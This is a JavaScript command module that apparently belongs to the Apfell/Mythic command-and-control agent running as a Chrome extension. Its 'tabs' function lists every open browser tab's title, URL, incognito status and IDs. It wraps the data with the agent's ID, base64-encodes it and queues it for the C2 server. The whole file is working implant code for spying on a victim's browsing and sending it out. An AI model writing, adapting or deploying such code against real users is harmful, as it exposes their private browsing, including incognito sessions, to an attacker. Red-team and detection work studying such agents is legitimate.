tabs = function(task) {
    const queryInfo = {};
    let tabs =[];
    chrome.tabs.query(queryInfo, function(result){
        for (i = 0; i < result.length; i++) {
            const individualTab = {};
            individualTab.window = result[i].title;
            individualTab.url = result[i].url;
            individualTab.incognito = result[i].incognito;
            individualTab.id = result[i].id;
            individualTab.active = result[i].active;
            individualTab.highlighted = result[i].highlighted;
            individualTab.windowid = result[i].windowId;

            tabs.push(individualTab);
        }

        response = {"task_id":task['task_id'], "user_output":JSON.stringify(tabs, null, 2), "completed": true};
        outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
        enc = JSON.stringify(outer_response);
        final = apfell.apfellid + enc;
        msg = btoa(unescape(encodeURIComponent(final)));
        out.push(msg);
    });
};

C2.commands[tabs.name] = tabs;
COMMAND_ENDS_HERE
